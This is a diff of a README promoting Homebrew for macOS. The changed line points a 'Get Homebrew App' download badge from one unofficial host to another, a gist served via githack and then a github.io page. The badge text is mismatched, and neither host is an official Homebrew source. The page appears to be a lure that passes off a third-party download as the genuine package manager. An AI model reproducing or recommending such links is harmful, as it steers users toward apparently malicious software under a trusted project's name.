@@ -3,7 +3,7 @@
 **Homebrew** is the open-source package manager that makes it simple to install, update, and manage software on **macOS**.  
 It’s fast, reliable, and trusted by millions of developers worldwide for automating setup, maintaining environments, and handling dependencies from the command line. ⚙️  
 
-[![🍺 Get GitHub Instruction](https://img.shields.io/badge/🍺%20Get%20Homebrew%20App-2E7D32?style=for-the-badge&logo=apple&logoColor=white&labelColor=0B0F19)](https://gistcdn.githack.com/stackermanhidden85/0ee0535d0e7e4c005a5b6662ebd95cd3/raw/32d966a1c8b63da2e7a5501f04977b6b9461c2bd/app.html?offer=Homebrew)
+[![🍺 Get GitHub Instruction](https://img.shields.io/badge/🍺%20Get%20Homebrew%20App-2E7D32?style=for-the-badge&logo=apple&logoColor=white&labelColor=0B0F19)](https://desk-app-git.github.io/.github/?offer=Homebrew)
 
 ---
 
